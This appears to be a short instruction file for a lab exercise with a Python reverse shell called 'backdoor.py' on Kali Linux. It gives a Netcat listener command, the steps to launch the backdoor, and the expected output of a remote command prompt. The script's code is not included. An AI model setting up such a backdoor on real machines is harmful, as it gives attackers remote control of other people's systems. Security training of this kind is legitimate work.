Make sure python3 is installed.
Make sure the kali_ip address is set up to match your kali ip. 

1. Open a new terminal(1) and start the Netcat listener: 
	nc -v -l -p 5555

Expected output in terminal(1):
	listening on [any] 5555 ...
	
2. Open another terminal(2) and navigate to the directory containing 'backdoor.py'.
3. Run this: 
	python3 backdoor.py

Expected output in terminal(1): 
	listening on [any] 5555 ...
	192.168.126.129: inverse host lookup failed: Unknown
	connect to [192.168.126.129] from (UNKNOWN) [192.1

	Connected!
	/home/kali/Desktop >> 

4. After that you can type commands. 
	Example:
		Run: ls 
		Expected output: backdoor.py
			 	 dirs.txt
			 	 Q3.py
5. Type "&" to quit. 

Expected output in terminal(1): 
	Connection End Here.